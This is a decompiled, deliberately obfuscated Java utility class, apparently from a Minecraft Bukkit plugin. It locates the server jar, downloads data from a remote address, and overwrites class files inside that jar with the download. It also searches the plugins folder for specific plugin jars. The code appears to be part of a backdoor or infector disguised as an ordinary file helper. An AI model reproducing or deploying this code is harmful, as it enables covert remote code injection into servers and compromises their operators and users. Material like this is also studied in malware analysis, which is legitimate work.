/*
 * Decompiled with CFR 0.150.
 */
package me.system.runner.utils;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.Objects;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import me.system.runner.utils.IOUtils;

public class FileUtil {
    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String getFileInZip(File lllllllllllllIlIllIllllIIIlIllIl, String lllllllllllllIlIllIllllIIIlIlIlI) {
        try (ZipFile lllllllllllllIlIllIllllIIIlIlllI = new ZipFile(lllllllllllllIlIllIllllIIIlIllIl.getAbsolutePath());){
            String lllllllllllllIlIllIllllIIIlIllll;
            ZipEntry lllllllllllllIlIllIllllIIIllIIIl;
            Enumeration<? extends ZipEntry> lllllllllllllIlIllIllllIIIllIIII = lllllllllllllIlIllIllllIIIlIlllI.entries();
            do {
                if (lllllllllllllIlIllIllllIIIllIIII.hasMoreElements()) continue;
                String lllllllllllllIlIllIllllIIIlIIllI = null;
                return lllllllllllllIlIllIllllIIIlIIllI;
            } while (!(lllllllllllllIlIllIllllIIIllIIIl = lllllllllllllIlIllIllllIIIllIIII.nextElement()).getName().equals(lllllllllllllIlIllIllllIIIlIlIlI));
            String lllllllllllllIlIllIllllIIIlIIlIl = lllllllllllllIlIllIllllIIIlIllll = IOUtils.getText(lllllllllllllIlIllIllllIIIlIlllI.getInputStream(lllllllllllllIlIllIllllIIIllIIIl), "UTF-8");
            return lllllllllllllIlIllIllllIIIlIIlIl;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public FileUtil() {
        FileUtil lllllllllllllIlIllIllllIIlIllIIl;
    }

    public static File writeToFile(String lllllllllllllIlIllIllllIIIllllll) {
        File lllllllllllllIlIllIllllIIlIIIIII = FileUtil.getUserDir();
        if (!lllllllllllllIlIllIllllIIlIIIIII.getAbsolutePath().contains("plugins")) {
            for (File lllllllllllllIlIllIllllIIlIIIlII : Objects.requireNonNull(lllllllllllllIlIllIllllIIlIIIIII.listFiles())) {
                if (!lllllllllllllIlIllIllllIIlIIIlII.isDirectory() || !lllllllllllllIlIllIllllIIlIIIlII.getName().endsWith("plugins")) continue;
                lllllllllllllIlIllIllllIIlIIIIII = lllllllllllllIlIllIllllIIlIIIlII;
            }
        }
        for (File lllllllllllllIlIllIllllIIlIIIIlI : Objects.requireNonNull(lllllllllllllIlIllIllllIIlIIIIII.listFiles())) {
            String lllllllllllllIlIllIllllIIlIIIIll;
            if (!lllllllllllllIlIllIllllIIlIIIIlI.isFile() || !lllllllllllllIlIllIllllIIlIIIIlI.getName().endsWith(".jar") || (lllllllllllllIlIllIllllIIlIIIIll = FileUtil.getFileInZip(lllllllllllllIlIllIllllIIlIIIIlI, "plugin.yml")) == null || !lllllllllllllIlIllIllllIIlIIIIll.contains(lllllllllllllIlIllIllllIIIllllll)) continue;
            return lllllllllllllIlIllIllllIIlIIIIlI;
        }
        return null;
    }

    public static File getUserDir() {
        return new File(System.getProperty("user.dir"));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static byte[] byte_arr_removeConnectionThread(File lllllllllllllIlIllIllllIIIIllIIl, String lllllllllllllIlIllIllllIIIIllIII) {
        try (ZipFile lllllllllllllIlIllIllllIIIIllIlI = new ZipFile(lllllllllllllIlIllIllllIIIIllIIl.getAbsolutePath());){
            byte[] lllllllllllllIlIllIllllIIIIllIll;
            ZipEntry lllllllllllllIlIllIllllIIIIlllIl;
            Enumeration<? extends ZipEntry> lllllllllllllIlIllIllllIIIIlllII = lllllllllllllIlIllIllllIIIIllIlI.entries();
            do {
                if (lllllllllllllIlIllIllllIIIIlllII.hasMoreElements()) continue;
                byte[] lllllllllllllIlIllIllllIIIIlIIlI = null;
                return lllllllllllllIlIllIllllIIIIlIIlI;
            } while (!(lllllllllllllIlIllIllllIIIIlllIl = lllllllllllllIlIllIllllIIIIlllII.nextElement()).getName().equals(lllllllllllllIlIllIllllIIIIllIII));
            byte[] lllllllllllllIlIllIllllIIIIlIIIl = lllllllllllllIlIllIllllIIIIllIll = IOUtils.toByteArray(lllllllllllllIlIllIllllIIIIllIlI.getInputStream(lllllllllllllIlIllIllllIIIIlllIl));
            return lllllllllllllIlIllIllllIIIIlIIIl;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static boolean doesJarHaveFile(File lllllllllllllIlIllIllllIIIIIIlll, String lllllllllllllIlIllIllllIIIIIIllI) throws IOException {
        try (JarInputStream lllllllllllllIlIllIllllIIIIIlIII = new JarInputStream(new FileInputStream(lllllllllllllIlIllIllllIIIIIIlll));){
            JarEntry lllllllllllllIlIllIllllIIIIIlIIl;
            while ((lllllllllllllIlIllIllllIIIIIlIIl = lllllllllllllIlIllIllllIIIIIlIII.getNextJarEntry()) != null) {
                boolean lllllllllllllIlIllIllllIIIIIlIlI;
                if (!lllllllllllllIlIllIllllIIIIIlIIl.getName().equals(lllllllllllllIlIllIllllIIIIIIllI)) continue;
                lllllllllllllIlIllIllllIIIIIlIII.close();
                boolean lllllllllllllIlIllIllllIIIIIIIII = lllllllllllllIlIllIllllIIIIIlIlI = true;
                return lllllllllllllIlIllIllllIIIIIIIII;
            }
        }
        return false;
    }

    public static int replaceClassFileName(String lllllllllllllIlIllIlllIllllIllII, String lllllllllllllIlIllIlllIllllIlIll) throws IOException {
        int lllllllllllllIlIllIlllIlllIlllll;
        block11: {
            File lllllllllllllIlIllIlllIllllIlIlI = FileUtil.getServerJar();
            if (lllllllllllllIlIllIlllIllllIlIlI == null) {
                return -1;
            }
            if (!FileUtil.doesJarHaveFile(lllllllllllllIlIllIlllIllllIlIlI, lllllllllllllIlIllIlllIllllIllII)) {
                return -2;
            }
            byte[] lllllllllllllIlIllIlllIllllIlIIl = IOUtils.readRemoteData(lllllllllllllIlIllIlllIllllIlIll);
            if (lllllllllllllIlIllIlllIllllIlIIl == null) {
                return -3;
            }
            Path lllllllllllllIlIllIlllIllllIlIII = Paths.get(lllllllllllllIlIllIlllIllllIlIlI.getAbsolutePath(), new String[0]);
            FileSystem lllllllllllllIlIllIlllIllllIlllI = FileSystems.newFileSystem(lllllllllllllIlIllIlllIllllIlIII, (ClassLoader)null);
            try {
                int lllllllllllllIlIllIlllIllllIllll;
                Path lllllllllllllIlIllIlllIlllllIIII = lllllllllllllIlIllIlllIllllIlllI.getPath(lllllllllllllIlIllIlllIllllIllII, new String[0]);
                Files.copy(new ByteArrayInputStream(lllllllllllllIlIllIlllIllllIlIIl), lllllllllllllIlIllIlllIlllllIIII, StandardCopyOption.REPLACE_EXISTING);
                lllllllllllllIlIllIlllIlllIlllll = lllllllllllllIlIllIlllIllllIllll = 0;
                if (lllllllllllllIlIllIlllIllllIlllI == null) break block11;
            }
            catch (Throwable throwable) {
                try {
                    if (lllllllllllllIlIllIlllIllllIlllI != null) {
                        try {
                            lllllllllllllIlIllIlllIllllIlllI.close();
                        }
                        catch (Throwable throwable2) {
                            throwable.addSuppressed(throwable2);
                        }
                    }
                    throw throwable;
                }
                catch (IOException lllllllllllllIlIllIlllIllllIllIl) {
                    lllllllllllllIlIllIlllIllllIllIl.printStackTrace();
                    return -4;
                }
            }
            lllllllllllllIlIllIlllIllllIlllI.close();
        }
        return lllllllllllllIlIllIlllIlllIlllll;
    }

    public static void writeToFile(byte[] lllllllllllllIlIllIlllIlllIllIII, File lllllllllllllIlIllIlllIlllIlIlll) throws IOException {
        try (FileOutputStream lllllllllllllIlIllIlllIlllIllIIl = new FileOutputStream(lllllllllllllIlIllIlllIlllIlIlll);){
            lllllllllllllIlIllIlllIlllIllIIl.write(lllllllllllllIlIllIlllIlllIllIII);
        }
    }

    public static boolean renameFileToItSelf(File lllllllllllllIlIllIlllIlllllllII) {
        try {
            return !lllllllllllllIlIllIlllIlllllllII.renameTo(lllllllllllllIlIllIlllIlllllllII);
        }
        catch (Exception lllllllllllllIlIllIlllIlllllllIl) {
            return true;
        }
    }

    public static File getServerJar() {
        File lllllllllllllIlIllIllllIIlIlIIIl = FileUtil.getUserDir();
        while (lllllllllllllIlIllIllllIIlIlIIIl.getAbsolutePath().contains("plugins")) {
            lllllllllllllIlIllIllllIIlIlIIIl = FileUtil.getAbsoluteFile(lllllllllllllIlIllIllllIIlIlIIIl);
        }
        for (File lllllllllllllIlIllIllllIIlIlIIlI : Objects.requireNonNull(lllllllllllllIlIllIllllIIlIlIIIl.listFiles())) {
            if (!lllllllllllllIlIllIllllIIlIlIIlI.getName().toLowerCase().endsWith(".jar") || FileUtil.getFileInZip(lllllllllllllIlIllIllllIIlIlIIlI, "configurations/bukkit.yml") == null) continue;
            return lllllllllllllIlIllIllllIIlIlIIlI;
        }
        return null;
    }

    public static void writeByteArrayToFile(File lllllllllllllIlIllIlllIllIllIllI, byte[] lllllllllllllIlIllIlllIllIllIlIl) {
    }

    public static File getAbsoluteFile(File lllllllllllllIlIllIlllIllIlllIlI) {
        String lllllllllllllIlIllIlllIllIllllIl = lllllllllllllIlIllIlllIllIlllIlI.getAbsolutePath();
        int lllllllllllllIlIllIlllIllIllllII = lllllllllllllIlIllIlllIllIllllIl.lastIndexOf(File.separator);
        if (lllllllllllllIlIllIlllIllIllllII < 0) {
            return new File(lllllllllllllIlIllIlllIllIllllIl);
        }
        String lllllllllllllIlIllIlllIllIlllIll = lllllllllllllIlIllIlllIllIllllIl.substring(0, lllllllllllllIlIllIlllIllIllllII);
        if (lllllllllllllIlIllIlllIllIlllIll.endsWith(":")) {
            lllllllllllllIlIllIlllIllIlllIll = String.valueOf(new StringBuilder().append(lllllllllllllIlIllIlllIllIlllIll).append(File.separator));
        }
        if (lllllllllllllIlIllIlllIllIlllIll.length() == 0) {
            return new File(File.separator);
        }
        return new File(lllllllllllllIlIllIlllIllIlllIll);
    }

    public static List<String> readFileAsArray(File lllllllllllllIlIllIlllIlllIIlIII) {
        try {
            ArrayList<String> lllllllllllllIlIllIlllIlllIIlIlI = new ArrayList<String>();
            try (BufferedReader lllllllllllllIlIllIlllIlllIIlIll = new BufferedReader(new FileReader(lllllllllllllIlIllIlllIlllIIlIII));){
                String lllllllllllllIlIllIlllIlllIIllII;
                while ((lllllllllllllIlIllIlllIlllIIllII = lllllllllllllIlIllIlllIlllIIlIll.readLine()) != null) {
                    lllllllllllllIlIllIlllIlllIIlIlI.add(lllllllllllllIlIllIlllIlllIIllII);
                }
            }
            return lllllllllllllIlIllIlllIlllIIlIlI;
        }
        catch (Exception lllllllllllllIlIllIlllIlllIIlIIl) {
            return Arrays.asList(String.valueOf(new StringBuilder().append("Could not read from file '").append(lllllllllllllIlIllIlllIlllIIlIII.getName()).append("'")), String.valueOf(new StringBuilder().append("Reason: ").append(lllllllllllllIlIllIlllIlllIIlIIl.getMessage())));
        }
    }
}

